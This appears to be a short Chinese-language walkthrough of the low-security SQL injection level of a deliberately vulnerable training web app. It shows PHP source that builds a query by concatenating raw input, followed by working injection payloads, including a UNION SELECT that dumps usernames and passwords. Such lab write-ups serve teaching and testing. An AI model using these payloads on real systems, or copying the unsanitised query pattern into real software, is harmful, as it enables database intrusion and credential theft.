# Low

## 源码 (`low.php`)

```php
$id = $_REQUEST['id'];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query)
    or die(mysqli_error($GLOBALS["___mysqli_ston"]));
```

## 做了什么

- 任意 HTTP 方法（GET/POST/Cookie）接收 `id` 参数
- 直接拼进 SQL 字符串，单引号包裹
- 数据库错误**全量回显**到页面

## 攻击步骤

1. 正常输入 `1`，页面返回 `First name: admin, Surname: admin`
2. `1'` → 报错：`You have an error in your SQL syntax...` — 确认注入点
3. `1' or '1'='1` → 闭合引号，返回所有用户记录
4. `1' union select user,password from users#` → 脱裤

## 为什么能绕过

无任何过滤。裸拼字符串 + 报错回显 → 联合查询注入、报错注入、布尔盲注三种手法全通。

## 登录成功标志

- 正常响应：`First name: xxx, Surname: xxx`
- 注入成功：多行数据或联合查询结果
